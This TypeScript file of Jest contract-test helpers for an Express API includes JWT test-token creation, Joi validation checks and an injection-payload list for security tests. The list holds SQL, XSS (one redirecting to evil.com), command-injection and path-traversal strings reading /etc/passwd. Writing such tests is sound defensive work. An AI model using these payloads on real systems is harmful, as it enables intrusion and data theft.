/**
 * Contract Test Helpers
 * Shared utilities for contract testing across all layers
 */

import { jest } from '@jest/globals';
import express, { Express, Router } from 'express';
import { errorHandler } from '../../middleware/errorHandler';
import Joi from 'joi';

// Type for mock function
type MockFn = jest.Mock<(...args: any[]) => any>;

/**
 * Creates a minimal Express test app with a route module mounted
 * Uses mocked auth middleware and real error handler
 */
export function createTestApp(routeModule: Router, routePath: string, options?: { skipAuth?: boolean }): Express {
  const app = express();
  app.use(express.json({ limit: '10mb' }));

  if (!options?.skipAuth) {
    // Default auth middleware that reads Bearer token
    app.use((req, _res, next) => {
      const authHeader = req.headers.authorization;
      if (authHeader && authHeader.startsWith('Bearer ')) {
        try {
          const jwt = require('jsonwebtoken');
          const token = authHeader.split(' ')[1];
          const decoded = jwt.verify(token, process.env.JWT_SECRET || 'test-jwt-secret-key-for-testing-purposes-only-min-32-chars');
          (req as any).user = decoded;
        } catch {
          // Token invalid - leave req.user undefined
        }
      }
      next();
    });
  }

  app.use(routePath, routeModule);
  app.use(errorHandler);
  return app;
}

/**
 * Creates a valid JWT token for test requests
 */
export function createAuthToken(user: {
  id?: string;
  email?: string;
  role?: string;
  organizationId?: string;
} = {}): string {
  const jwt = require('jsonwebtoken');
  const payload = {
    id: user.id || 'user-123',
    email: user.email || 'test@example.com',
    role: user.role || 'Admin',
    organizationId: user.organizationId || 'org-123',
  };
  return jwt.sign(payload, process.env.JWT_SECRET || 'test-jwt-secret-key-for-testing-purposes-only-min-32-chars', { expiresIn: '1h' });
}

/**
 * Validates a Joi schema against valid and invalid payloads
 */
export function validateJoiContract(
  schema: Joi.ObjectSchema | Joi.ArraySchema,
  validPayload: Record<string, unknown>,
  invalidPayloads: Array<{ payload: Record<string, unknown>; expectedError: string }>
) {
  describe('valid payload', () => {
    it('should accept valid payload', () => {
      const { error, value } = schema.validate(validPayload, {
        abortEarly: false,
        stripUnknown: true,
        convert: true,
      });
      expect(error).toBeUndefined();
      expect(value).toBeDefined();
    });
  });

  describe('invalid payloads', () => {
    invalidPayloads.forEach(({ payload, expectedError }, index) => {
      it(`should reject invalid payload #${index + 1}: ${expectedError}`, () => {
        const { error } = schema.validate(payload, {
          abortEarly: false,
          stripUnknown: true,
          convert: true,
        });
        expect(error).toBeDefined();
        const messages = error!.details.map(d => d.message).join('; ');
        expect(messages).toContain(expectedError);
      });
    });
  });
}

/**
 * Asserts the response body matches an expected shape
 */
export function assertResponseShape(body: unknown, expectedShape: Record<string, unknown>) {
  expect(body).toMatchObject(expectedShape);
}

/**
 * Asserts a Prisma mock was called with expected arguments
 */
export function assertPrismaCallShape(mockFn: MockFn, expectedArgs: Record<string, unknown>) {
  expect(mockFn).toHaveBeenCalled();
  const callArgs = mockFn.mock.calls[0][0];
  expect(callArgs).toMatchObject(expectedArgs);
}

/**
 * Security test payloads for injection testing
 */
export const INJECTION_PAYLOADS = {
  sql: [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "UNION SELECT * FROM users--",
    "1; DELETE FROM risks WHERE 1=1",
    "' OR 1=1 --",
  ],
  xss: [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '"><script>document.location="http://evil.com"</script>',
  ],
  nosql: [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "this.password"}',
  ],
  commandInjection: [
    '; ls -la',
    '| cat /etc/passwd',
    '$(whoami)',
    '`id`',
  ],
  prototypePollution: [
    { '__proto__': { isAdmin: true } },
    { 'constructor': { 'prototype': { isAdmin: true } } },
  ],
  pathTraversal: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32',
    '%2e%2e%2f%2e%2e%2f',
  ],
};

/**
 * Creates standard test users for role-based testing
 */
export const TEST_USERS = {
  admin: { id: 'user-admin', email: 'admin@test.com', role: 'Admin', organizationId: 'org-123' },
  editor: { id: 'user-editor', email: 'editor@test.com', role: 'Editor', organizationId: 'org-123' },
  viewer: { id: 'user-viewer', email: 'viewer@test.com', role: 'Viewer', organizationId: 'org-123' },
  otherOrg: { id: 'user-other', email: 'other@test.com', role: 'Admin', organizationId: 'org-other' },
};

/**
 * Common response shape matchers
 */
export const RESPONSE_SHAPES = {
  error: { error: expect.any(String) },
  paginatedList: {
    data: expect.any(Array),
    total: expect.any(Number),
  },
  created: expect.objectContaining({
    id: expect.any(String),
  }),
};
